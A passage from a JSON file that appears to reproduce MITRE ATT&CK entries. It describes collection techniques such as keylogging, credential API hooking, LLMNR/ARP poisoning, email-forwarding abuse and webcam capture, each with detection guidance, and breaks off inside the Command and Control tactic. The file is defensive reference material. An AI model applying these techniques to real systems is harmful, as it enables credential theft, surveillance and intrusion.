        "description": " \nAn adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information. \nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.  ",
        "detection": "\nDetection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the microphone, recording devices, or recording software, and a process periodically writing files to disk that contain audio data.\n\n"
      },
      "T1119": {
        "name": "Automated Collection",
        "description": " \nOnce established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a  Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. This functionality could also be built into remote access tools. \nThis technique may incorporate use of other techniques such as  File and Directory Discovery and  Lateral Tool Transfer to identify and move files.  ",
        "detection": "\nDepending on the method used, actions could include common file system commands and parameters on the command-line interface within batch files or scripts. A sequence of actions like this may be unusual, depending on the system and network environment. Automated collection may occur along with other techniques such as Data Staged. As such, file access monitoring that shows an unusual process performing sequential file opens and potentially copy actions to another location on the file system for many files at once may indicate automated collection behavior. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1115": {
        "name": "Clipboard Data",
        "description": " \nAdversaries may collect data stored in the clipboard from users copying information within or between applications. \nIn Windows, Applications can access clipboard data by using the Windows API.  \nOSX provides a native command,  pbpaste , to grab clipboard contents.  \n ",
        "detection": "\nAccess to the clipboard is a legitimate function of many applications on an operating system. If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity.\n\n"
      },
      "T1530": {
        "name": "Data from Cloud Storage Object",
        "description": " \nAdversaries may access data objects from improperly secured cloud storage. \nMany cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. Solution providers typically offer security guides to help end users configure systems.  \n \n \n\nMisconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information.  \n \n \nAdversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.  ",
        "detection": "\nMonitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity.\n\n"
      },
      "T1602": {
        "name": "Data from Configuration Repository",
        "description": " \nAdversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices. \nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.  \n \n ",
        "detection": "\nIdentify network traffic sent or received by untrusted hosts or networks that solicits and obtains the configuration information of the queried device. \n\n"
      },
      "T1602.001": {
        "name": "SNMP (MIB Dump)",
        "description": " \nAdversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP). \nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages  \n. The MIB may also contain device operational information, including running configuration, routing table, and interface details. \nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation.  \n \n  ",
        "detection": "\nIdentify network traffic sent or received by untrusted hosts or networks that expose MIB content or use unauthorized protocols. \n\n"
      },
      "T1602.002": {
        "name": "Network Device Configuration Dump",
        "description": " \nAdversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use. \nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.  \n  \nThese tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.  ",
        "detection": "\nIdentify network traffic sent or received by untrusted hosts or networks. Configure signatures to identify strings that may be found in a network device configuration.  \n\n"
      },
      "T1213": {
        "name": "Data from Information Repositories",
        "description": " \nAdversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information. \nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository: Policies, procedures, and standards Physical / logical network diagrams System architecture diagrams Technical system documentation Testing / development credentials Work / project schedules Source code snippets Links to network shares and other internal resources \nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include  Sharepoint ,  Confluence , and enterprise databases such as SQL Server.  ",
        "detection": "\nAs information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.The user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents.   The user access logging within Atlassian's Confluence can also be configured to report access to certain pages and documents through AccessLogFilter.   Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.\n\n"
      },
      "T1213.001": {
        "name": "Confluence",
        "description": " \nAdversaries may leverage Confluence repositories to mine valuable information. Often found in development environments alongside Atlassian JIRA, Confluence is generally used to store development-related documentation, however, in general may contain more diverse categories of useful information, such as: Policies, procedures, and standards Physical / logical network diagrams System architecture diagrams Technical system documentation Testing / development credentials Work / project schedules Source code snippets Links to network shares and other internal resources  ",
        "detection": "\nMonitor access to Confluence repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies.User access logging within Atlassian's Confluence can be configured to report access to certain pages and documents through AccessLogFilter.   Additional log storage and analysis infrastructure will likely be required for more robust detection capabilities.\n\n"
      },
      "T1213.002": {
        "name": "Sharepoint",
        "description": " \nAdversaries may leverage the SharePoint repository as a source to mine valuable information. SharePoint will often contain useful information for an adversary to learn about the structure and functionality of the internal network and systems. For example, the following is a list of example information that may hold potential value to an adversary and may also be found on SharePoint: Policies, procedures, and standards Physical / logical network diagrams System architecture diagrams Technical system documentation Testing / development credentials Work / project schedules Source code snippets Links to network shares and other internal resources  ",
        "detection": "\nThe user access logging within Microsoft's SharePoint can be configured to report access to certain pages and documents.  . As information repositories generally have a considerably large user base, detection of malicious use can be non-trivial. At minimum, access to information repositories performed by privileged users (for example, Active Directory Domain, Enterprise, or Schema Administrators) should be closely monitored and alerted upon, as these types of accounts should not generally used to access information repositories. If the capability exists, it may be of value to monitor and alert on users that are retrieving and viewing a large number of documents and pages; this behavior may be indicative of programmatic means being used to retrieve all data within the repository. In environments with high-maturity, it may be possible to leverage User-Behavioral Analytics (UBA) platforms to detect and alert on user based anomalies. \n\n"
      },
      "T1005": {
        "name": "Data from Local System",
        "description": " \nAdversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration. \nAdversaries may do this using a  Command and Scripting Interpreter , such as  cmd , which has functionality to interact with the file system to gather information. Some adversaries may also use  Automated Collection on the local system.  ",
        "detection": "\nMonitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1039": {
        "name": "Data from Network Shared Drive",
        "description": " \nAdversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within  cmd may be used to gather information.  ",
        "detection": "\nMonitor processes and command-line arguments for actions that could be taken to collect files from a network share. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1025": {
        "name": "Data from Removable Media",
        "description": " \nAdversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within  cmd may be used to gather information. \nSome adversaries may also use  Automated Collection on removable media.  ",
        "detection": "\nMonitor processes and command-line arguments for actions that could be taken to collect files from a system's connected removable media. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1074": {
        "name": "Data Staged",
        "description": " \nAdversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as  Archive Collected Data . Interactive command shells may be used, and common functionality within  cmd and bash may be used to copy data into a staging location.  \n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may  Create Cloud Instance and stage data in that instance.  \n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.  ",
        "detection": "\nProcesses that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1074.001": {
        "name": "Local Data Staging",
        "description": " \nAdversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as  Archive Collected Data . Interactive command shells may be used, and common functionality within  cmd and bash may be used to copy data into a staging location.  ",
        "detection": "\nProcesses that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1074.002": {
        "name": "Remote Data Staging",
        "description": " \nAdversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as  Archive Collected Data . Interactive command shells may be used, and common functionality within  cmd and bash may be used to copy data into a staging location. \nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may  Create Cloud Instance and stage data in that instance.  \n\nBy staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.  ",
        "detection": "\nProcesses that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.Monitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1114": {
        "name": "Email Collection",
        "description": " \nAdversaries may target user email to collect sensitive information. Emails may contain sensitive data, including trade secrets or personal information, that can prove valuable to adversaries. Adversaries can collect or forward email from mail servers or clients.  ",
        "detection": "\nThere are likely a variety of ways an adversary could collect email from a target, each with a different mechanism for detection.File access of local system email files for Exfiltration, unusual processes connecting to an email server within a network, or unusual access patterns or authentication attempts on a public-facing webmail server may all be indicators of malicious activity.Monitor processes and command-line arguments for actions that could be taken to gather local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.Detection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include X-MS-Exchange-Organization-AutoForwarded set to true, X-MailFwdBy and X-Forwarded-To. The forwardingSMTPAddress parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.  High volumes of emails that bear the X-MS-Exchange-Organization-AutoForwarded header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.\n\n"
      },
      "T1114.001": {
        "name": "Local Email Collection",
        "description": " \nAdversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user’s local system, such as Outlook storage or cache files. \nOutlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.  \nIMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in  C:\\Users\\<username>\\Documents\\Outlook Files or  C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook .  \n ",
        "detection": "\nMonitor processes and command-line arguments for actions that could be taken to gather local email files. Monitor for unusual processes accessing local email files. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as Windows Management Instrumentation and PowerShell.\n\n"
      },
      "T1114.002": {
        "name": "Remote Email Collection",
        "description": " \nAdversaries may target an Exchange server or Office 365 to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services or Office 365 to access email using credentials or access tokens. Tools such as  MailSniper can be used to automate searches for specific keywords.  ",
        "detection": "\nMonitor for unusual login activity from unknown or abnormal locations, especially for privileged accounts (ex: Exchange administrator account).\n\n"
      },
      "T1114.003": {
        "name": "Email Forwarding Rule",
        "description": " \nAdversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email-forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations.  \nOutlook and Outlook Web App (OWA) allow users to create inbox rules for various email functions, including forwarding to a different recipient. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.  \n \nAny user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more.  ",
        "detection": "\nDetection is challenging because all messages forwarded because of an auto-forwarding rule have the same presentation as a manually forwarded message. It is also possible for the user to not be aware of the addition of such an auto-forwarding rule and not suspect that their account has been compromised; email-forwarding rules alone will not affect the normal usage patterns or operations of the email account.Auto-forwarded messages generally contain specific detectable artifacts that may be present in the header; such artifacts would be platform-specific. Examples include X-MS-Exchange-Organization-AutoForwarded set to true, X-MailFwdBy and X-Forwarded-To. The forwardingSMTPAddress parameter used in a forwarding process that is managed by administrators and not by user actions. All messages for the mailbox are forwarded to the specified SMTP address. However, unlike typical client-side rules, the message does not appear as forwarded in the mailbox; it appears as if it were sent directly to the specified destination mailbox.  High volumes of emails that bear the X-MS-Exchange-Organization-AutoForwarded header (indicating auto-forwarding) without a corresponding number of emails that match the appearance of a forwarded message may indicate that further investigation is needed at the administrator level rather than user-level.\n\n"
      },
      "T1056": {
        "name": "Input Capture",
        "description": " \nAdversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g.  Credential API Hooking ) or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g.  Web Portal Capture ).  ",
        "detection": "\nDetection may vary depending on how input is captured but may include monitoring for certain Windows API calls (e.g. SetWindowsHook, GetKeyState, and GetAsyncKeyState) , monitoring for malicious instances of Command and Scripting Interpreter, and ensuring no unauthorized drivers or kernel modules that could indicate keylogging or API hooking are present.\n\n"
      },
      "T1056.001": {
        "name": "Keylogging",
        "description": " \nAdversaries may log user keystrokes to intercept credentials as the user types them. Keylogging is likely to be used to acquire credentials for new access opportunities when  OS Credential Dumping efforts are not effective, and may require an adversary to intercept keystrokes on a system for a substantial period of time before credentials can be successfully captured. \nKeylogging is the most prevalent type of input capture, with many different ways of intercepting keystrokes.  \nSome methods include: Hooking API callbacks used for processing keystrokes. Unlike  Credential API Hooking , this focuses solely on API functions intended for processing keystroke data. Reading raw keystroke data from the hardware buffer. Windows Registry modifications. Custom drivers.  Modify System Image may provide adversaries with hooks into the operating system of network devices to read raw keystrokes for login sessions.  \n  ",
        "detection": "\nKeyloggers may take many forms, possibly involving modification to the Registry and installation of a driver, setting a hook, or polling to intercept keystrokes. Commonly used API calls include SetWindowsHook, GetKeyState, and GetAsyncKeyState.  Monitor the Registry and file system for such changes, monitor driver installs, and look for common keylogging API calls. API calls alone are not an indicator of keylogging, but may provide behavioral data that is useful when combined with other information such as new files written to disk and unusual processes.\n\n"
      },
      "T1056.002": {
        "name": "GUI Input Capture",
        "description": " \nAdversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex:  Bypass User Account Control ). \nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.  \nThis type of prompt can be used to collect credentials via various languages such as AppleScript  \n \nand PowerShell  \n \n.  ",
        "detection": "\nMonitor process execution for unusual programs as well as malicious instances of Command and Scripting Interpreter that could be used to prompt users for credentials.Inspect and scrutinize input prompts for indicators of illegitimacy, such as non-traditional banners, text, timing, and/or sources.\n\n"
      },
      "T1056.003": {
        "name": "Web Portal Capture",
        "description": " \nAdversaries may install code on externally facing portals, such as a VPN login page, to capture and transmit credentials of users who attempt to log into the service. For example, a compromised login page may log provided user credentials before logging the user in to the service. \nThis variation on input capture may be conducted post-compromise using legitimate administrative access as a backup measure to maintain network access through  External Remote Services and  Valid Accounts or as part of the initial compromise by exploitation of the externally facing web service.  \n ",
        "detection": "\nFile monitoring may be used to detect changes to files in the Web directory for organization login pages that do not match with authorized updates to the Web server's content.\n\n"
      },
      "T1056.004": {
        "name": "Credential API Hooking",
        "description": " \nAdversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.  \nUnlike  Keylogging ,  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:  Hooks procedures , which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.  \n \n Import address table (IAT) hooking , which use modifications to a process’s IAT, where pointers to imported API functions are stored.  \n \n \n Inline hooking , which overwrites the first bytes in an API function to redirect code flow.  \n \n \n ",
        "detection": "\nMonitor for calls to the SetWindowsHookEx and SetWinEventHook functions, which install a hook procedure.   Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools    or by programmatically examining internal kernel structures.  Rootkits detectors  can also be used to monitor for various types of hooking activity.Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes  to compare the in-memory IAT to the real addresses of the referenced functions.  \n\n"
      },
      "T1185": {
        "name": "Man in the Browser",
        "description": " \nAdversaries can take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify behavior, and intercept information as part of various man in the browser techniques.  \n\nA specific example is when an adversary injects software into a browser that allows an them to inherit cookies, HTTP sessions, and SSL client certificates of a user and use the browser as a way to pivot into an authenticated intranet.  \n  \n\nBrowser pivoting requires the SeDebugPrivilege and a high-integrity process to execute. Browser traffic is pivoted from the adversary's browser through the user's browser by setting up an HTTP proxy which will redirect any HTTP and HTTPS traffic. This does not alter the user's traffic in any way. The proxy connection is severed as soon as the browser is closed. Whichever browser process the proxy is injected into, the adversary assumes the security context of that process. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could browse to any resource on an intranet that is accessible through the browser and which the browser has sufficient permissions, such as Sharepoint or webmail. Browser pivoting also eliminates the security provided by 2-factor authentication.  \n ",
        "detection": "\nThis is a difficult technique to detect because adversary traffic would be masked by normal user traffic. No new processes are created and no additional software touches disk. Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior. Monitor for process injection against browser applications\n\n"
      },
      "T1557": {
        "name": "Man-in-the-Middle",
        "description": " \nAdversaries may attempt to position themselves between two or more networked devices using a man-in-the-middle (MiTM) technique to support follow-on behaviors such as  Network Sniffing or  Transmitted Data Manipulation . By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.  \n\nAdversaries may leverage the MiTM position to attempt to modify traffic, such as in  Transmitted Data Manipulation . Adversaries can also stop traffic from flowing to the appropriate destination, causing denial of service.  ",
        "detection": "\nMonitor network traffic for anomalies associated with known MiTM behavior. Consider monitoring for modifications to system configuration files involved in shaping network traffic flow.\n\n"
      },
      "T1557.001": {
        "name": "LLMNR/NBT-NS Poisoning and SMB Relay",
        "description": " \nBy responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. \nLink-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name.  \n  \n\nAdversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through  Network Sniffing and crack the hashes offline through  Brute Force to obtain the plaintext passwords. In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.  \n \n\nSeveral tools exist that can be used to poison name services within local networks such as NBNSpoof, Metasploit, and  Responder .  \n  \n  \n ",
        "detection": "\nMonitor HKLM\\Software\\Policies\\Microsoft\\Windows NT\\DNSClient for changes to the \"EnableMulticast\" DWORD value. A value of \"0\" indicates LLMNR is disabled.  Monitor for traffic on ports UDP 5355 and UDP 137 if LLMNR/NetBIOS is disabled by security policy.Deploy an LLMNR/NBT-NS spoofing detection tool.  Monitoring of Windows event logs for event IDs 4697 and 7045 may help in detecting successful relay techniques. \n\n"
      },
      "T1557.002": {
        "name": "ARP Cache Poisoning",
        "description": " \nAdversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as  Network Sniffing or  Transmitted Data Manipulation . \nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.  \nDevices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache. \nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment. \nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.  \n \n\nAdversaries may use ARP cache poisoning as a means to man-in-the-middle (MiTM) network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.  \n ",
        "detection": "\nMonitor network traffic for unusual ARP traffic, gratuitous ARP replies may be suspicious. Consider collecting changes to ARP caches across endpoints for signs of ARP poisoning. For example, if multiple IP addresses map to a single MAC address, this could be an indicator that the ARP cache has been poisoned.\n\n"
      },
      "T1113": {
        "name": "Screen Capture",
        "description": " \nAdversaries may attempt to take screen captures of the desktop to gather information over the course of an operation. Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations. Taking a screenshot is also typically possible through native utilities or API calls, such as  CopyFromScreen ,  xwd , or  screencapture .  \n \n ",
        "detection": "\nMonitoring for screen capture behavior will depend on the method used to obtain data from the operating system and write output files. Detection methods could include collecting information from unusual processes using API calls used to obtain image data, and monitoring for image files written to disk. The sensor data may need to be correlated with other events to identify malicious activity, depending on the legitimacy of this behavior within a given network environment.\n\n"
      },
      "T1125": {
        "name": "Video Capture",
        "description": " \nAn adversary can leverage a computer's peripheral devices (e.g., integrated cameras or webcams) or applications (e.g., video call services) to capture video recordings for the purpose of gathering information. Images may also be captured from devices or applications, potentially in specified intervals, in lieu of video files. \nMalware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture video or images. Video or image files may be written to disk and exfiltrated later. This technique differs from  Screen Capture due to use of specific devices or applications for video recording rather than capturing the victim's screen. \nIn macOS, there are a few different malware samples that record the user's webcam such as FruitFly and Proton.  \n ",
        "detection": "\nDetection of this technique may be difficult due to the various APIs that may be used. Telemetry data regarding API use may not be useful depending on how a system is normally used, but may provide context to other potentially malicious activity occurring on a system.Behavior that could indicate technique use include an unknown or unusual process accessing APIs associated with devices or software that interact with the video camera, recording devices, or recording software, and a process periodically writing files to disk that contain video or camera image data.\n\n"
      }
    }
  },
  "TA0011": {
    "name": "Command and Control",
    "description": "\nThe adversary is trying to communicate with compromised systems to control them.Command and Control consists of techniques that adversaries may use to communicate with systems under their control within a victim network. Adversaries commonly attempt to mimic normal, expected traffic to avoid detection. There are many ways an adversary can establish command and control with various levels of stealth depending on the victim’s network structure and defenses.\n",
    "technique": {
      "T1071": {
        "name": "Application Layer Protocol",
        "description": " \nAdversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data. \n\n"
      },
      "T1071.001": {
        "name": "Web Protocols",
        "description": " \nAdversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nProtocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data. Monitor for web traffic to/from known-bad or suspicious domains. \n\n"
      },
      "T1071.002": {
        "name": "File Transfer Protocols",
        "description": " \nAdversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \nProtocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.  ",
        "detection": "\nAnalyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used. \n\n"
      },
      "T1071.003": {
        "name": "Mail Protocols",
